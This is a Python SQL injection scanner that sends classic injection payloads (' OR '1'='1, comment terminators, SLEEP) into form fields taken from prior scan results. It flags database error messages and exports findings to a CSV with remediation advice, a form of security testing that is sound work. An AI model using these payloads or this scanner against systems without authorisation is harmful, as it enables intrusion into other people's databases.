import json
import requests
import csv
from urllib.parse import urljoin

ERRORS = ["you have an error in your sql syntax",
          "unclosed quotation mark",
          "quoted string not properly terminated",
          "mysql_fetch",
          "syntax error"]
PAYLOADS = ["' OR '1'='1", "\" OR \"1\"=\"1", "1' --", "1\" --", "admin' or '1'='1'--", "1 OR SLEEP(5)--"]

def check_vulnerable(response):
    content = response.text.lower()
    for error in ERRORS:
        if error in content:
            return True
    return False

def test_injection(form, session):
    url = form["url"]
    action_url = urljoin(url, form["action"])
    method = form["method"]
    rows = []
    print(f"\n[+] Testing {url} for SQL Injection...")
    for payload in PAYLOADS:
        data = {}
        for field in form["inputs"]:
            if field["type"] == "submit" or not field["name"]:
                continue
            data[field["name"]] = payload
        try:
            if method == "post":
                resp = session.post(action_url, data=data)
            else:
                resp = session.get(action_url, params=data)
            if check_vulnerable(resp):
                print(f"VULNERABLE: {action_url} with {field['name']} payload: {payload}")
                rows.append(["SQL Injection", url, field["name"], "High", f"Payload {payload} succeeded.", "Use parameterized queries."])
        except Exception as e:
            print(f"[!] Error testing injection on {action_url}: {e}")
    return rows

def save_results_to_csv(filename, rows):
    header = ["Type", "Endpoint", "Parameter", "Severity", "Details", "Mitigation"]
    with open(filename, "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(header)
        for row in rows:
            writer.writerow(row)
    print(f"[*] Results saved to {filename}")

if __name__ == "__main__":
    with open("v1_scan_results.json", "r") as f:
        data = json.load(f)
    forms = data["forms"]
    session = requests.Session()
    all_rows = []
    for form in forms:
        all_rows.extend(test_injection(form, session))
    save_results_to_csv("sql_injection_results.csv", all_rows)
